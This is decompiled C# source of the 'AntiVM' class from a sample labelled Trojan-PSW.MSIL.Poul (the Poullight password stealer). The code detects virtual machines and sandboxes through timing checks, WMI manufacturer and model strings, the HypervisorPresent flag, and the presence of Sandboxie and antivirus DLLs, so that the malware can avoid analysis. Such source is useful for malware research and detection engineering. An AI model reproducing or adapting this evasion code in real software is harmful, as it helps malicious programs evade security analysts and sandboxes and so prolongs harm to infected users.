// Decompiled with JetBrains decompiler
// Type: AntiVM
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using System;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Threading;

internal class AntiVM
{
  protected static bool CheckAdministrator() => Process.GetCurrentProcess().ProcessName.ToLower() == "pll_test";

  public static bool CheckVM()
  {
    try
    {
      if (AntiVM.CheckAdministrator())
        return false;
      long tickCount = (long) Environment.TickCount;
      Thread.Sleep(500);
      if ((long) Environment.TickCount - tickCount < 500L)
        return false;
      using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
      {
        Sqlite.SqliteFile();
        using (ManagementObjectCollection objectCollection = managementObjectSearcher.Get())
        {
          foreach (ManagementBaseObject managementBaseObject in objectCollection)
          {
            string lower = managementBaseObject["Manufacturer"].ToString().ToLower();
            if ((!(lower == "microsoft corporation") || !managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) && !lower.Contains("vmware") && !(managementBaseObject["Model"].ToString() == "VirtualBox"))
            {
              IntPtr moduleHandle = WinApi.GetModuleHandle("cmdvrt32.dll");
              if (moduleHandle.ToInt32() == 0)
              {
                moduleHandle = WinApi.GetModuleHandle("SxIn.dll");
                if (moduleHandle.ToInt32() == 0)
                {
                  moduleHandle = WinApi.GetModuleHandle("SbieDll.dll");
                  if (moduleHandle.ToInt32() == 0)
                  {
                    moduleHandle = WinApi.GetModuleHandle("sf2.dll");
                    if (moduleHandle.ToInt32() == 0)
                    {
                      moduleHandle = WinApi.GetModuleHandle("snxhk.dll");
                      if (moduleHandle.ToInt32() == 0)
                      {
                        bool? nullable = (bool?) managementBaseObject.Properties.OfType<PropertyData>().FirstOrDefault<PropertyData>((Func<PropertyData, bool>) (p => p.Name == "HypervisorPresent"))?.Value;
                        bool flag = true;
                        if ((nullable.GetValueOrDefault() == flag ? (nullable.HasValue ? 1 : 0) : 0) != 0)
                          return false;
                        continue;
                      }
                    }
                  }
                }
              }
            }
            return true;
          }
        }
      }
      return false;
    }
    catch
    {
    }
    return false;
  }
}
